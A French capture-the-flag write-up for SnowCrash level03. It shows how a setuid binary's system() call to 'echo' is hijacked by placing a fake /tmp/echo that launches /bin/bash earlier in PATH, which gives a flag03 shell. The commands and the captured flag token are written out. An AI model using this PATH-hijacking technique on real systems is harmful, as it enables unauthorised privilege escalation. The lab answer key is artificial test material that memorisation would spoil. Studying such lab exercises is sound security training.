# Level03

Un trouve un exécutable nommé <code>level03</code> qui, quand lancé, nous affiche "Exploit me". On lance donc <code>ltrace</code> pour comprendre ce que fait le programme.

<pre>$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580
getegid()                                             = 2003
geteuid()                                             = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)   = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)   = 0
system("/usr/bin/env echo Exploit me"Exploit me
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                     = 0
+++ exited (status 0) +++</pre>

Le programme fait appel à system pour lancer la commande <code>echo</code>. On peut donc créer notre propre version de <code>echo</code> qui lancera <code>/bin/bash</code> avec les droits de l'owner. Pour cela il faut creer notre fichier echo et remplacer le path pour qu'il soit appelé :

<pre>$ echo "/bin/bash" > /tmp/echo
$ chmod 777 /tmp/echo
$ export PATH=/tmp:$PATH</pre>

On lance ensuite le programme :

<pre>level03@SnowCrash:~$ ./level03
bash: /home/user/level03/.bashrc: Permission denied
flag03@SnowCrash:~$</pre>

On voit que notre user a changé, nous sommes maintenant flag03

<pre>$ getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus</pre>

https://opensource.com/article/20/4/linux-binary-analysis
https://stackoverflow.com/questions/8304396/what-is-vulnerable-about-this-c-code
